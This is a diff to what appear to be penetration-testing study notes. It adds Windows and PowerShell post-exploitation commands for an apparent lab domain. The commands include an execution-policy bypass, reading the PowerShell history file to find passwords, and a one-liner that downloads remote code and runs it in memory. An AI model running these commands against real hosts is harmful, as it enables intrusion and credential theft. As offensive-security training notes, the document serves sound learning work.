@@ -696,6 +696,27 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 ----------------
 
 - Basic enumeration Commands
- - `hostname`-:``
+ - `hostname`-:`Prints the PC's name`
+ - `[System.Environment]::OSVersion.Version`:`Prints out the OS version and revision level`
+
+ <img width="559" height="155" alt="image" src="https://github.com/user-attachments/assets/b32cd515-7030-45d2-89e6-d0cf792b0896" />
+
+ - `wmic qfe get Caption,Description,HotFixID,InstalledOn`:`prints the patches to the host`:`prints out patches to the host`
+ - `ipconfig /all`:`Network information`
+ - `set`: `environmental variables`
+ -  `echo %USERDOMAIN%`:`prints user domain`
+ -  `echo %logonserver%`
+
+-----------------  
+
+- Harnessing powershell-:
+  - `Get-Module`:`Show modules`
+  - `Get-ExecutionPolicy -List`:`prints the execution process for a host`
+  - ` Set-ExecutionPolicy Bypass -Scope Process`:`Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.`
+  - `Get-ChildItem Env: | ft key,value`:`Return environment values such as key paths, users, computer information, etc.`
+  - `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`:`With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.`
+  - `powershell -nop -c "iex(New-Object New-WebClient).DownloadString('url');Some Command"`:`This is a quick and easy way to download a file from the web using PowerShell and call it from memory.`
+
+- Downgrading powershell
 
 ------------------
